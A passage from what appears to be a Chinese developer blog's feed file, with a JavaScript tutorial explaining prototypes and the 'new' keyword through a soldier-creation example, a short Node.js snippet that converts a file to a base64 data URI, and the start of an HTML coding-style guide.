&#125;,</span><br><span class="line">    攻击:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*糊他熊脸*/</span>   &#125;,</span><br><span class="line">    防御:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*护脸*/</span>       &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  士兵们.<span class="built_in">push</span>(士兵)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">兵营.批量制造(士兵们)</span><br></pre></td></tr></table></figure><p>哎呀好简单。</p><p><strong>质疑</strong><br>上面的代码存在一个问题：浪费了很多内存。</p><ol><li>行走、奔跑、死亡、攻击、防御这五个动作对于每个士兵其实是一样的，只需要各自引用同一个函数就可以了，没必要重复创建 100 个行走、100个奔跑……</li><li>这些士兵的兵种和攻击力都是一样的，没必要创建 100 次。</li><li>只有 ID 和生命值需要创建 100 次，因为每个士兵有自己的 ID 和生命值。</li></ol><p><strong>改进</strong><br>如果用上文的原型链来做呢~<br>用原型链可以解决重复创建的问题：我们先创建一个「士兵原型」，然后让「士兵」的 <strong>proto</strong> 指向「士兵原型」</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> 士兵原型 = &#123;</span><br><span class="line">  兵种:<span class="string">&quot;美国大兵&quot;</span>,</span><br><span class="line">  攻击力:<span class="number">5</span>,</span><br><span class="line">  行走:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*走俩步的代码*/</span>&#125;，</span><br><span class="line">  奔跑:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*狂奔的代码*/</span>  &#125;,</span><br><span class="line">  死亡:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*Go die*/</span>    &#125;,</span><br><span class="line">  攻击:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*糊他熊脸*/</span>   &#125;,</span><br><span class="line">  防御:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*护脸*/</span>       &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> 士兵们 = []</span><br><span class="line"><span class="keyword">var</span> 士兵</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">100</span>; i++)&#123;</span><br><span class="line">  士兵 = &#123;</span><br><span class="line">    <span class="attr">ID</span>: i, <span class="comment">// ID 不能重复</span></span><br><span class="line">    生命值:<span class="number">42</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*实际工作中不要这样写，因为 __proto__ 不是标准属性*/</span></span><br><span class="line">  士兵.__proto__ = 士兵原型 </span><br><span class="line"></span><br><span class="line">  士兵们.<span class="built_in">push</span>(士兵)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">兵营.批量制造(士兵们)</span><br></pre></td></tr></table></figure><p><strong>优雅？</strong><br>有人指出创建一个士兵的代码分散在两个地方很不优雅，于是我们用一个函数把这两部分联系起来：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> 士兵(<span class="params">ID</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> 临时对象 = &#123;&#125;</span><br><span class="line"></span><br><span class="line">  临时对象.__proto__ = 士兵.原型</span><br><span class="line"></span><br><span class="line">  临时对象.ID = ID</span><br><span class="line">  临时对象.生命值 = <span class="number">42</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> 临时对象</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">士兵.原型 = &#123;</span><br><span class="line">  兵种:<span class="string">&quot;美国大兵&quot;</span>,</span><br><span class="line">  攻击力:<span class="number">5</span>,</span><br><span class="line">  行走:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*走俩步的代码*/</span>&#125;，</span><br><span class="line">  奔跑:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*狂奔的代码*/</span>  &#125;,</span><br><span class="line">  死亡:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*Go die*/</span>    &#125;,</span><br><span class="line">  攻击:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*糊他熊脸*/</span>   &#125;,</span><br><span class="line">  防御:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*护脸*/</span>       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存为文件：士兵.js</span></span><br></pre></td></tr></table></figure><p>然后就可以愉快地引用「士兵」来创建士兵了：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var</span> 士兵们 = <span class="selector-attr">[]</span></span><br><span class="line"><span class="function"><span class="title">for</span><span class="params">(var i=<span class="number">0</span>; i&lt;<span class="number">100</span>; i++)</span></span>&#123;</span><br><span class="line">  士兵们<span class="selector-class">.push</span>(士兵(i))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">兵营.批量制造(士兵们)</span><br></pre></td></tr></table></figure><p>but~~~~</p><h4 id="首先遇到的问题就是我们无法在实际工作中使用-proto"><a href="#首先遇到的问题就是我们无法在实际工作中使用-proto" class="headerlink" title="首先遇到的问题就是我们无法在实际工作中使用 __proto__"></a>首先遇到的问题就是我们无法在实际工作中使用 <code>__proto__</code></h4><blockquote><p>所以JS 之父创建了 <code>new</code> 关键字，可以让我们少写三行代码<br>    ——来自JS 之父的关怀</p></blockquote><p><img src="/Blog/2018/09/30/essay/JS%E4%B8%89%E5%A4%A7%E7%BB%8F%E5%85%B8-new%E5%88%B0%E5%BA%95%E5%B9%B2%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F/index/img_3.png"></p><p>只要你在士兵前面使用 new 关键字，那么可以少做四件事情：</p><ol><li>不用创建临时对象，因为 new 会帮你做（你使用「this」就可以访问到临时对象）；</li><li>不用绑定原型，因为 new 会帮你做（new 为了知道原型在哪，所以指定原型的名字为 prototype）；</li><li>不用 return 临时对象，因为 new 会帮你做；</li><li>不要给原型想名字了，因为 new 指定名字为 prototype。</li></ol><p><strong>这一次我们用 new 来写</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> 士兵(<span class="variable constant_">ID</span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">ID</span> = <span class="variable constant_">ID</span></span><br><span class="line">  <span class="variable language_">this</span>.生命值 = <span class="number">42</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">士兵.<span class="property"><span class="keyword">prototype</span></span> = &#123;</span><br><span class="line">  兵种:<span class="string">&quot;美国大兵&quot;</span>,</span><br><span class="line">  攻击力:<span class="number">5</span>,</span><br><span class="line">  行走:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*走俩步的代码*/</span>&#125;,</span><br><span class="line">  奔跑:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*狂奔的代码*/</span>  &#125;,</span><br><span class="line">  死亡:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*Go die*/</span>    &#125;,</span><br><span class="line">  攻击:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*糊他熊脸*/</span>   &#125;,</span><br><span class="line">  防御:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*护脸*/</span>       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存为文件：士兵.js</span></span><br></pre></td></tr></table></figure><p>然后是创建士兵（加了一个 new 关键字）：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var</span> 士兵们 = <span class="selector-attr">[]</span></span><br><span class="line"><span class="function"><span class="title">for</span><span class="params">(var i=<span class="number">0</span>; i&lt;<span class="number">100</span>; i++)</span></span>&#123;</span><br><span class="line">  士兵们<span class="selector-class">.push</span>(new 士兵(i))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">兵营.批量制造(士兵们)</span><br></pre></td></tr></table></figure><blockquote><p>new 的作用，就是省那么几行代码。（也就是所谓的语法糖）</p></blockquote><p>哦对，这其中还有一个叫做 <code>constructor</code> 的属性</p><p>new 操作为了记录「临时对象是由哪个函数创建的」，所以预先给「士兵.prototype」加了一个 constructor 属性：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">士兵.proto<span class="keyword">type</span> = &#123;</span><br><span class="line">  constructor: 士兵</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你重新对「士兵.prototype」赋值，那么这个 constructor 属性就没了，所以你应该这么写：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">士兵.<span class="property"><span class="keyword">prototype</span></span> = &#123;</span><br><span class="line">  <span class="attr">constructor</span>: xx士兵,</span><br><span class="line">  兵种:<span class="string">&quot;美国大兵&quot;</span>,</span><br><span class="line">  攻击力:<span class="number">5</span>,</span><br><span class="line">  行走:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*走俩步的代码*/</span>&#125;,</span><br><span class="line">  奔跑:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*狂奔的代码*/</span>  &#125;,</span><br><span class="line">  死亡:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*Go die*/</span>    &#125;,</span><br><span class="line">  攻击:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*糊他熊脸*/</span>   &#125;,</span><br><span class="line">  防御:<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">/*护脸*/</span>       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>end本文完~<hr><p>最后在更新一道检测题，看你是否真的已经掌握 <code>new</code>(此题有坑)</p><p>要求不使用 class，完成如下需求：</p><ol><li>写出一个构造函数 Animal<br>i.输入为空<br>ii.输出为一个新对象，该对象的共有属性为 <code>&#123;行动: function()&#123;&#125;&#125;</code> ，没有自有属性</li><li>再写出一个构造函数 Human<br>i.Human 继承 Animal<br>ii.输入为一个对象，如 <code>&#123;name: &#39;xxx&#39;, birthday: &#39;2000-10-10&#39;&#125;</code><br>iii.输出为一个新对象，该对象自有的属性有 name 和 birthday，共有的属性有物种（人类）、行动和使用工具</li><li>在写出一个构造函数 Asian<br>i.Asian 继承 Human<br>ii.输入为一个对象，如 <code>&#123;city: &#39;浙江&#39;, name: &#39;xxx&#39;, birthday: &#39;2000-10-10&#39; &#125;</code><br>iii.输出为一个新对象，改对象自有的属性有 name city 和 bitrhday，共有的属性有物种、行动和使用工具和肤色<br>既<blockquote><p>最后一个新对象是 Asian 构造出来的<br>Asian 继承 Human，Human 继承 Animal</p></blockquote></li></ol><p>注意，不要使用 class 关键字，请使用原型链（答案可以写在评论区哦~）</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NodeJs将任意文件(或本地文件)转换为base64（buffer）</title>
      <link href="/Blog/2018/09/29/node_js/NodeJs%E5%B0%86%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6(%E6%88%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6)%E8%BD%AC%E6%8D%A2%E4%B8%BAbase64%EF%BC%88buffer%EF%BC%89/index/"/>
      <url>/Blog/2018/09/29/node_js/NodeJs%E5%B0%86%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6(%E6%88%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6)%E8%BD%AC%E6%8D%A2%E4%B8%BAbase64%EF%BC%88buffer%EF%BC%89/index/</url>
      
        <content type="html"><![CDATA[<p>很多图片音频等文件，有时候可能需要读取到数据中或者放到单文件的HTML中时，将它们转换成为base64格式是一个好方法，nodejs可以很方便的把文件转换为base64格式：<br>需要依赖库“fs”，“path”，“mime-types”，库mime-types可通过npm安装，具体的代码如下：</p><hr><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = require(&#x27;fs&#x27;);</span><br><span class="line"><span class="keyword">const</span> path = require(&#x27;path&#x27;);</span><br><span class="line"><span class="keyword">const</span> mineType = require(&#x27;mime-types&#x27;);  // 文件类型</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> filePath = path.resolve(&#x27;your/file/path&#x27;);  // 如果是本地文件</span><br><span class="line"><span class="keyword">let</span> data = fs.readFileSync(filePath);</span><br><span class="line"><span class="keyword">let</span> bufferData = new <span class="type">Buffer</span>(data,&#x27;base64&#x27;); </span><br><span class="line"><span class="keyword">let</span> base64 = &#x27;data:&#x27; + mineType.lookup(filePath) + &#x27;;base64,&#x27; + data; </span><br><span class="line">fs.writeFileSync(path.resolve(&#x27;your/save/file/path&#x27;), base64, err =&gt; <span class="meta">&#123;...&#125;</span>);</span><br><span class="line">// fs.writeFile(&#x27;your/save/file/path&#x27;, base64, err =&gt; <span class="meta">&#123;...&#125;</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>编码规范 by @littleyu</title>
      <link href="/Blog/2018/09/29/essay/%E7%BC%96%E7%A0%81%E8%A7%84%E8%8C%83-by-@littleyu/index/"/>
      <url>/Blog/2018/09/29/essay/%E7%BC%96%E7%A0%81%E8%A7%84%E8%8C%83-by-@littleyu/index/</url>
      
        <content type="html"><![CDATA[<h2 id="编写灵活、稳定、高质量的-HTML-和-CSS-代码的规范。"><a href="#编写灵活、稳定、高质量的-HTML-和-CSS-代码的规范。" class="headerlink" title="编写灵活、稳定、高质量的 HTML 和 CSS 代码的规范。"></a>编写灵活、稳定、高质量的 HTML 和 CSS 代码的规范。</h2><hr><h1 id="——HTML——"><a href="#——HTML——" class="headerlink" title="——HTML——"></a>——HTML——</h1><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul><li>用两个空格来代替制表符（tab） – 这是唯一能保证在所有环境下获得一致展现的方法（不过现在的编辑器都可以改tab为两个空格）。</li><li>嵌套元素应当缩进一次（即两个空格）。</li><li>对于属性的定义，确保全部使用双引号，绝不要使用单引号。</li><li>不要在自闭合（self-closing）元素的尾部添加斜线 – <a href="http://dev.w3.org/html5/spec-author-view/syntax.html#syntax-start-tag">HTML5 规范</a>中明确说明这是可选的。</li><li>不要省略可选的结束标签（closing tag）（例如，<code>&lt;/li&gt;</code> 或 <code>&lt;/body&gt;</code>）。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Page title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;images/company-logo.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Company&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;hello-world&quot;</span>&gt;</span>Hello, world!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="语言属性"><a href="#语言属性" class="headerlink" title="语言属性"></a>语言属性</h3><p>根据 HTML5 规范：</p><blockquote><p>强烈建议为 html 根元素指定 lang 属性，从而为文档设置正确的语言。这将有助于语音合成工具确定其所应该采用的发音，有助于翻译工具确定其翻译时所应遵守的规则等等。</p></blockquote><p>更多关于 <code>lang</code> 属性的知识可以从 <a href="http://www.w3.org/html/wg/drafts/html/master/semantics.html#the-html-element">此规范</a> 中了解。</p><p>这里列出了<a href="http://reference.sitepoint.com/html/lang-codes">语言代码表</a>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//推荐使用属性值 cmn-Hans-CN（简体, 中国大陆），但是考虑浏览器和操作系统的兼容性，目前仍然使用 zh-CN 属性值</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- ... --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h6 id="更多关于-Languages-Tags-："><a href="#更多关于-Languages-Tags-：" class="headerlink" title="更多关于 Languages Tags ："></a>更多关于 Languages Tags ：</h6><p><a href="http://www.w3.org/International/articles/language-tags/">W3C Language tags in HTML and XML</a><br><a href="http://www.zhihu.com/question/20797118?utm_source=weibo&utm_medium=weibo_share&utm_content=share_question&utm_campaign=share_sidebar">网页头部的声明应该是用 lang&#x3D;”zh” 还是 lang&#x3D;”zh-cn”？</a></p><p>###HTML代码大小写<br>HTML标签名、类名、标签属性和大部分属性值统一用小写</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Bad */</span></span><br><span class="line">&lt;<span class="keyword">div</span> <span class="keyword">class</span>=<span class="string">&quot;DEMO&quot;</span>&gt;&lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;<span class="keyword">DIV</span> <span class="keyword">CLASS</span>=<span class="string">&quot;DEMO&quot;</span>&gt;&lt;/<span class="keyword">DIV</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Good*/</span></span><br><span class="line">&lt;<span class="keyword">div</span> <span class="keyword">class</span>=<span class="string">&quot;demo&quot;</span>&gt;&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></table></figure><p>###特殊字符引用<br>文本可以和字符引用混合出现。这种方法可以用来转义在文本中不能合法出现的字符。</p><p>在 HTML 中不能使用小于号 “&lt;” 和大于号 “&gt;”特殊字符，浏览器会将它们作为标签解析，若要正确显示，在 HTML 源代码中使用字符实体</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* Bad */</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>more&gt;&gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">/* Good*/</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>more<span class="symbol">&amp;gt;</span><span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>更多关于符号引用：<a href="http://www.w3.org/TR/html5/syntax.html#character-references">#Character references</a><br>###纯数字输入框<br>使用 <code>type=&quot;tel&quot;</code> 而不是 <code>type=&quot;number&quot;</code></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;tel&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="IE-兼容模式"><a href="#IE-兼容模式" class="headerlink" title="IE 兼容模式"></a>IE 兼容模式</h3><p>IE 支持通过特定的 <code>&lt;meta&gt;</code> 标签来确定绘制当前页面所应该采用的 IE 版本。除非有强烈的特殊需求，否则最好是设置为 <strong>edge mode</strong>，从而通知 IE 采用其所支持的最新的模式。</p><p><a href="http://stackoverflow.com/questions/6771258/whats-the-difference-if-meta-http-equiv-x-ua-compatible-content-ie-edge-e">阅读这篇 stack overflow 上的文章</a>可以获得更多有用的信息。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta <span class="attribute">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attribute">content</span>=<span class="string">&quot;IE=Edge&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="字符编码-一般编辑器都能自动生成"><a href="#字符编码-一般编辑器都能自动生成" class="headerlink" title="字符编码(一般编辑器都能自动生成~)"></a>字符编码(一般编辑器都能自动生成~)</h3><p>通过明确声明字符编码，能够确保浏览器快速并容易的判断页面内容的渲染方式。这样做的好处是，可以避免在 HTML 中使用字符实体标记（character entity），从而全部与文档编码一致（一般采用 UTF-8 编码）。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><p>###单行注释<br>一般用于简单的描述，如某些状态描述、属性描述等</p><p>注释内容前后各一个空格字符，注释位于要注释代码的上面，单独占一行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/* Bad */</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!-- Comment Text --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="comment">&lt;!-- Comment Text --&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* Good*/</span><br><span class="line"><span class="comment">&lt;!-- Comment Text --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="模块注释"><a href="#模块注释" class="headerlink" title="模块注释"></a>模块注释</h3><p>一般用于描述模块的名称以及模块开始与结束的位置</p><p>注释内容前后各一个空格字符，<!-- S Comment Text --> 表示模块开始，<!-- E Comment Text --> 表示模块结束，模块与模块之间相隔一行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/* Bad */</span><br><span class="line"><span class="comment">&lt;!-- S Comment Text A --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mod_a&quot;</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- E Comment Text A --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- S Comment Text B --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mod_b&quot;</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- E Comment Text B --&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* Good*/</span><br><span class="line"><span class="comment">&lt;!-- S Comment Text A --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mod_a&quot;</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- E Comment Text A --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- S Comment Text B --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mod_b&quot;</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- E Comment Text B --&gt;</span></span><br></pre></td></tr></table></figure><h3 id="嵌套模块注释"><a href="#嵌套模块注释" class="headerlink" title="嵌套模块注释"></a>嵌套模块注释</h3><p>当模块注释内再出现模块注释的时候，为了突出主要模块，嵌套模块不再使用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- S Comment Text --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- E Comment Text --&gt;</span></span><br><span class="line">而改用</span><br><span class="line"><span class="comment">&lt;!-- /Comment Text --&gt;</span></span><br><span class="line">注释写在模块结尾标签底部，单独一行。</span><br><span class="line"><span class="comment">&lt;!-- S Comment Text A --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mod_a&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mod_b&quot;</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- /mod_b --&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span 